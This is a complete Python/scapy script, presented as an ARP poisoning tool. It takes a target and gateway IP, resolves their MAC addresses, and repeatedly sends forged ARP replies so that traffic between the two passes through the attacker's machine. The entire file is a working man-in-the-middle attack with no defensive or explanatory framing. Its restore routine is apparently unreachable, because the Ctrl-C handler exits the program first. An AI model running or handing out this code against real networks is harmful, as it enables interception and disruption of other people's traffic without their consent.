#!/usr/bin/env python
from scapy.all import *
import sys
import signal
import netifaces
import argparse

parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
parser.add_argument('-i', '--interface', help='Interface to send packets through', required=True)
parser.add_argument('-t', '--target', help='IP address of target host', required=True)
parser.add_argument('-g', '--gateway', help='IP address of gateway', required=True)
args = parser.parse_args()

interface = args.interface
target_ip = args.target
gateway_ip = args.gateway

conf.iface = interface
conf.verb = 0

def get_mac_address_of_interface(interface):
    ifaddresses = netifaces.ifaddresses(interface)
    link_layer_address = ifaddresses[netifaces.AF_LINK]
    return link_layer_address[0]['addr']

def signal_handler(signal, frame):
    print("[*] Exiting program.")
    sys.exit(0)

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, attacker_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_target.hwsrc = attacker_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    poison_gateway.hwsrc = attacker_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        send(poison_target)
        send(poison_gateway)
        time.sleep(1)

signal.signal(signal.SIGINT, signal_handler)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting.")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (target_ip, target_mac))
    
attacker_mac = get_mac_address_of_interface(interface)

try:
    poison_target(gateway_ip, gateway_mac, target_ip, target_mac, attacker_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)